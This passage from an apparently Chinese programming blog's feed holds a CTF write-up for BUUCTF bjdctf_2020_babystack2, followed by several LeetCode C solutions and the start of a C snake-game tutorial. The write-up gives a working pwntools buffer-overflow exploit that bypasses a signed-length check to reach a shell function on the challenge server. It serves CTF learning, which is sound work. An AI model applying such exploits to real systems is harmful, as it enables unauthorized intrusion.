class="token punctuation">)</span>c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即可得到flag</p><h2 id="BUUCTF-bjdctf-2020-babystack2"><a href="#BUUCTF-bjdctf-2020-babystack2" class="headerlink" title="BUUCTF[bjdctf_2020_babystack2]"></a>BUUCTF[bjdctf_2020_babystack2]</h2><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>反汇编分析</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d5e567216626e19399368b99e84bb62bb1e58113.png"></p><p>即发现<strong>在if判断时nbytes时，nbytes是signed int 而执行read函数时为unsigned int型</strong></p><p>故如果输入nbytes时输入 -1 ，在if判断时为负数 &lt;10,而执行read函数时为最大值，可以输入更多的字符</p><p>且发现漏洞函数</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/c05a97398e9d9d740f15ca12c7e3a7c22f845250.png"></p><p>通过gdb调试计算buf的偏移量，得到<code>payload=&#39;a&#39;*(0x10+8)+p64(shell_addr)</code></p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh = process('./bjdctf_2020_babystack2')</span>sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token string">"25761"</span><span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> <span class="token number">0x0000000000400726</span>payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"of your name:"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-1"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"s u name?"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode.136.只出现一次的数字</title>
      <link href="//post/leetcode-136-%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97.html"/>
      <url>//post/leetcode-136-%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97.html</url>
      
        <content type="html"><![CDATA[<h1 id="leetcode-136-只出现一次的数字"><a href="#leetcode-136-只出现一次的数字" class="headerlink" title="leetcode.136.只出现一次的数字"></a>leetcode.136.只出现一次的数字</h1><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/fa38db8157238a0cebc301d57c593e6ce85879a0.png"></p><span id="more"></span><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p><p>说明：</p><p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p><p>示例：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">输入<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>输出<span class="token operator">:</span> <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="异或运算（-）"><a href="#异或运算（-）" class="headerlink" title="异或运算（ ^）"></a>异或运算（ <code>^</code>）</h2><p>异或运算符是指： 参与运算的两个值，如果两个相应位相同，则结果为0，否则为1。即：0^0=0， 1^0=1， 0^1=1， 1^1=0</p><p>例如：10100001^00010001=10110000</p><p>0^0=0,0^1=1 可理解为：0异或任何数，其结果=任何数</p><p>1^0=1,1^1=0 可理解为： 1异或任何数，其结果=任何数取反<br>任何数异或自己，等于把自己置0</p><ol><li>按位异或可以用来使某些特定的位翻转，如对数10100001的第1位和第2位翻转，可以将数与00000110进行按位异或运算。<br>　 10100001^00000110=10100111 </li></ol><p>用十六进制表示：0xA1 ^ 0x06= 0xA7</p><p>2.通过按位异或运算，可以实现两个值的交换，而不必使用临时变量。例如交换两个整数a，b的值，可通过下列语句实现：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">a<span class="token operator">=</span><span class="token number">10100001</span><span class="token punctuation">,</span>  b<span class="token operator">=</span><span class="token number">00000110</span>a<span class="token operator">=</span>a<span class="token operator">^</span>b； <span class="token comment">//a=10100111</span>b<span class="token operator">=</span>b<span class="token operator">^</span>a； <span class="token comment">//b=10100001</span>a<span class="token operator">=</span>a<span class="token operator">^</span>b； <span class="token comment">//a=00000110</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.异或运算符的特点是：数a两次异或同一个数b（a=a^b^b）仍然为原值a.</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>由异或运算符的性质：</p><p>a^a=0;</p><p>0^a=a;</p><p>a^b^c^b^a=c;</p><p>则这题可写为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">singleNumber</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> numsSize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numsSize<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        k<span class="token operator">=</span>k<span class="token operator">^</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode.217.存在重复元素</title>
      <link href="//post/leetcode-217-%E5%AD%98%E5%9C%A8%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0.html"/>
      <url>//post/leetcode-217-%E5%AD%98%E5%9C%A8%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0.html</url>
      
        <content type="html"><![CDATA[<h1 id="leetcode-217-存在重复元素"><a href="#leetcode-217-存在重复元素" class="headerlink" title="leetcode.217.存在重复元素"></a>leetcode.217.存在重复元素</h1><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/17b41ee5a92a64261e6062345a444c3a5c2adcf9.png"></p><span id="more"></span><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组，判断是否存在重复元素。</p><p>如果任意一值在数组中出现至少两次，函数返回 <code>true</code> 。如果数组中每个元素都不相同，则返回 <code>false</code> </p><p>示例：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">输入<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>输出<span class="token operator">:</span> true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>若只是使用简单的双指针对每两个数字进行对比，则会超时</p><p><strong>错误实例</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//超时做法</span>bool <span class="token function">containsDuplicate</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> numsSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> numsSize<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> numsSize<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="qsort-函数"><a href="#qsort-函数" class="headerlink" title="qsort()函数"></a>qsort()函数</h2><h3 id="qsort-函数-1"><a href="#qsort-函数-1" class="headerlink" title="qsort()函数"></a>qsort()函数</h3><p>头文件：#include &lt;stdlib.h&gt;</p><p>作用：sprintf()函数用于<strong>对数组进行排序</strong>。</p><p>函数原型：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">qsort</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>base<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nitems<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>compar<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数：</p><p><strong>base</strong> – 指向要排序的数组的第一个元素的指针</p><p><strong>nitems</strong> – 由 base 指向的数组中元素的个数。</p><p><strong>size</strong> – 数组中每个元素的大小，以字节为单位。</p><p><strong>compar</strong> – 用来比较两个元素的函数。</p><p><strong>&gt; 0 第一个传入数放第二个传入数后面；&lt; 0 第一个传入数放第二个传入数前面；</strong></p><p>返回值：无</p><h3 id="compar-函数参数"><a href="#compar-函数参数" class="headerlink" title="compar()函数参数"></a>compar()函数参数</h3><p>一般写作：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>a <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>b <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>返回正数就是说 cmp 传入参数第一个要放在第二个后面, 负数就是传入参数第一个要放第二个前面, 如果是 0, 那就无所谓谁前谁后。</p><h3 id="qsort-示例"><a href="#qsort-示例" class="headerlink" title="qsort()示例"></a>qsort()示例</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>a <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> nums<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> nums_size <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> nums_size<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>nums_size<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"nums[%d] = %d\n"</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>nums<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4</span>nums<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6</span>nums<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>为节省时间，可以把原数组排序，若相邻的数字都不相同，则可以返回false，否则返回true。</p><p>考虑到排序消耗的时间，采用qsort()快速排序。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>a <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>bool <span class="token function">containsDuplicate</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> numsSize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>numsSize <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> numsSize<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> numsSize <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> nums<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> true<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> false<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode.443.压缩字符串</title>
      <link href="//post/leetcode-443-%E5%8E%8B%E7%BC%A9%E5%AD%97%E7%AC%A6%E4%B8%B2.html"/>
      <url>//post/leetcode-443-%E5%8E%8B%E7%BC%A9%E5%AD%97%E7%AC%A6%E4%B8%B2.html</url>
      
        <content type="html"><![CDATA[<h1 id="leetcode-443-压缩字符串"><a href="#leetcode-443-压缩字符串" class="headerlink" title="leetcode.443.压缩字符串"></a>leetcode.443.压缩字符串</h1><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/95461249665c877c9fa67478390890ab68c50482.png"></p><span id="more"></span><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一组字符，使用原地算法将其压缩。</p><p>压缩后的长度必须始终小于或等于原数组长度。</p><p>数组的每个元素应该是长度为1 的字符（不是 int 整数类型）。</p><p>在完成原地修改输入数组后，返回数组的新长度。</p><p>示例：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">输入：<span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">]</span>输出：返回 <span class="token number">6</span> ，输入数组的前 <span class="token number">6</span> 个字符应该是：<span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">]</span>说明：<span class="token string">"aa"</span> 被 <span class="token string">"a2"</span> 替代。<span class="token string">"bb"</span> 被 <span class="token string">"b2"</span> 替代。<span class="token string">"ccc"</span> 被 <span class="token string">"c3"</span> 替代。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="sprintf-函数"><a href="#sprintf-函数" class="headerlink" title="sprintf()函数"></a>sprintf()函数</h2><p>头文件：#include &lt;stdio.h&gt;</p><p>作用：sprintf()函数用于<strong>将格式化的数据写入字符串</strong></p><p>函数原型：int sprintf(char *str, char * format [, argument, …]);</p><p>参数：str为要写入的字符串；format为格式化字符串，与printf()函数相同；argument为变量。</p><p>返回值：成功则返回参数str 字符串长度，失败则返回 -1。</p><p>除了前两个参数类型固定外，后面可以接任意多个参数。</p><p> printf()和sprintf()都使用格式化字符串来指定串的格式，在格式串内部使用一些以“%”开头的格式说明符（format specifications）来占据一个位置，在后边的变参列表中提供相应的变量，最终函数就会用相应位置的变量来替代那个说明符，产生一个调用者想要的字符串。</p><p>sprintf()最常见的应用之一莫过于把整数打印到字符串中，如：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//把整数123打印成一个字符串保存在s中</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sprintf的作用是将一个格式化的字符串输出到一个目的字符串中，而printf是将一个格式化的字符串输出到屏幕。</p><p><strong>注意</strong>：C语言对数组进行操作时并不检测数组的长度，如果str的长度不够，sprintf()很容易造成缓冲区溢出，</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h3><ul><li>大循环：采用双指针迭代的方法，由一个指针带着另一个走（ j = i ），由 i 跳过重复的元素</li><li>小循环1：对 i 进行自增，找到 j 的下一个位置</li><li>结果变量所指位置被赋为上一个处理完的元素</li><li>小循环2：将重复次数（即i和j的间隔）转为字符串，注意要用 <strong>sprintf()</strong> ，对结果变量所指位置赋值</li><li>返回结果变量</li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* C语言 */</span><span class="token keyword">int</span> <span class="token function">compress</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> chars<span class="token punctuation">,</span> <span class="token keyword">int</span> charsSize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> cur <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span><span class="token keyword">char</span> t<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> charsSize<span class="token punctuation">;</span> j <span class="token operator">=</span> i<span class="token punctuation">)</span>  <span class="token comment">//双指针做法</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> charsSize<span class="token punctuation">)</span>i<span class="token operator">++</span><span class="token punctuation">;</span>chars<span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//利用cur指向每个位置以对chars[]进行处理</span>cur<span class="token operator">++</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> j <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">continue</span><span class="token punctuation">;</span>   <span class="token comment">//强制开始下一次循环</span><span class="token function">sprintf</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"%d"</span><span class="token punctuation">,</span> i <span class="token operator">-</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//i-j的长度未知，且每个数字要占一个字符位，利用sprintf()将i-j的值转化为字符串</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> a <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span> a<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>chars<span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>cur<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> cur<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言学习-贪吃蛇</title>
      <link href="//post/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0-%E8%B4%AA%E5%90%83%E8%9B%87.html"/>
      <url>//post/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0-%E8%B4%AA%E5%90%83%E8%9B%87.html</url>
      
        <content type="html"><![CDATA[<h1 id="C语言学习-贪吃蛇"><a href="#C语言学习-贪吃蛇" class="headerlink" title="C语言学习-贪吃蛇"></a>C语言学习-贪吃蛇</h1><p>学C语言真的好累啊，不如写个游戏放松一下？？？？</p><p>注：源码放在最后</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/8ecdeddf0b1547cb5d7903e5c1614d6a46ad3024.png"></p><span id="more"></span><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="使用子函数改动main函数中变量的方法"><a href="#使用子函数改动main函数中变量的方法" class="headerlink" title="使用子函数改动main函数中变量的方法"></a>使用子函数改动main函数中变量的方法</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>在main函数中定义一个变量，然后可以将该变量的地址传给子函数，然后在子函数中以指针型式接受变量地址，即可使用*获得变量值，然后对其进行计算，只要保持其地址不变，即可改变main函数中该变量的值。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>例如：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//改变变量值的子函数</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span 